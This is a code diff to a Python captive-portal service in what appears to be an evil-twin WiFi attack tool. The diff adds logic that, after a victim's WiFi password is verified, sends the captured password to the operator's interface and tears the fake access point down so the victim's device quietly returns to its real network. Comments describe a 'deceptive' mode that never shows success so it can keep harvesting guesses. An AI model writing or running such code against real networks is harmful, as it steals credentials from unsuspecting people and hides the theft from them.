@@ -53,6 +53,10 @@ log = logging.getLogger(__name__)
 
 VERIFY_MODES = ("A", "B", "C")
 _MAX_CREDS = 500
+# After a *verified* capture we tear the evil twin down so the victim's
+# device falls back to its real AP. The operator UI shows a progress bar
+# for the same window before the twin disappears.
+_TEARDOWN_SECS = 8
 
 # Built-in landing page. Deliberately generic ("Router") rather than
 # impersonating a real brand. ``{ssid}`` and ``{msg}`` are substituted.
@@ -120,6 +124,12 @@ class CaptivePortalService:
         self._armed_line: str | None = None
         self._armed_ssid: str | None = None
         self._portal_active = False
+        # Flask app object, captured when pineap arms the portal, so the
+        # post-capture teardown timer (which runs in a context-less
+        # sentinel handler thread) can push an app context to call
+        # pineap.stop(). None until armed.
+        self._app: Any = None
+        self._teardown_scheduled = False
 
     # ---------- Config ----------
     def _load_config(self) -> dict[str, Any]:
@@ -196,6 +206,14 @@ class CaptivePortalService:
             self._armed_line = None
             self._armed_ssid = None
 
+    def set_runtime_app(self, app: Any) -> None:
+        """Capture the Flask app object so the post-capture teardown timer
+        can push an app context (the sentinel handler thread that calls
+        ``submit_credential`` has none). Called by pineap when it arms the
+        portal (bait-switch or direct launch)."""
+        with self._lock:
+            self._app = app
+
     def is_portal_active(self) -> bool:
         with self._lock:
             return self._portal_active and bool(self._load_config()["enabled"])
@@ -262,6 +280,25 @@ class CaptivePortalService:
                  client_mac or client_ip or "?", verified)
         self._emit(record)
 
+        # Does this submission conclude the portal session?
+        #   A — single attempt, always concludes.
+        #   B — concludes once we've verified the real PSK.
+        #   C — never concludes (deceptive: keeps farming guesses).
+        concluded = (mode == "A") or (mode == "B" and bool(verified))
+        if concluded:
+            # Stop the OS captive browser from re-popping the form: disarm
+            # the verifier so the next sentinel probe gets the truthful
+            # success token and the OS marks the network healthy (closes
+            # the CNA). Without this the captive page kept reappearing even
+            # after we already had the password.
+            self.disarm()
+        if verified:
+            # On a *verified* capture, tear the evil twin down after a short
+            # window so the victim's device falls back to its real AP. The
+            # operator UI shows a progress bar for the same window.
+            self._emit_captured(ssid, psk, mode)
+            self._schedule_teardown()
+
         # Response decision per mode.
         if mode == "A":
             return {"verified": verified, "message": "success", "accept_more": False}
@@ -271,6 +308,50 @@ class CaptivePortalService:
             return {"verified": verified, "message": "retry", "accept_more": True}
         # mode C — deceptive multi-try: never reveal success
         return {"verified": verified, "message": "retry", "accept_more": True}
+
+    def _emit_captured(self, ssid: str | None, psk: str, mode: str) -> None:
+        """Tell the operator UI a verified PSK landed so it can show the
+        teardown progress bar."""
+        try:
+            from app import socketio
+            socketio.emit("captive:captured", {
+                "ssid": ssid, "psk": psk, "verify_mode": mode,
+                "teardown_secs": _TEARDOWN_SECS,
+            }, namespace="/")
+        except Exception:
+            pass
+
+    def _schedule_teardown(self) -> None:
+        """Stop the evil twin ``_TEARDOWN_SECS`` from now, in a daemon
+        thread (the sentinel handler that calls us has no app context, so
+        we push the app captured at arm time). Idempotent within a session
+        — multiple verified hits schedule only one teardown."""
+        with self._lock:
+            if self._teardown_scheduled:
+                return
+            self._teardown_scheduled = True
+            app = self._app
+
+        def _run() -> None:
+            try:
+                time.sleep(_TEARDOWN_SECS)
+                if app is None:
+                    log.warning("captive_portal: no app captured — "
+                                "post-capture teardown skipped")
+                    return
+                with app.app_context():
+                    from app.services.pineap import get_service as get_pineap
+                    ok, msgs = get_pineap().stop()
+                    log.info("captive_portal: post-capture teardown ok=%s (%s)",
+                             ok, "; ".join(msgs))
+            except Exception:
+                log.exception("captive_portal: post-capture teardown failed")
+            finally:
+                with self._lock:
+                    self._teardown_scheduled = False
+
+        threading.Thread(target=_run, name="captive-teardown",
+                         daemon=True).start()
 
     # ---------- Credentials store ----------
     def _load_creds(self) -> list[dict[str, Any]]:
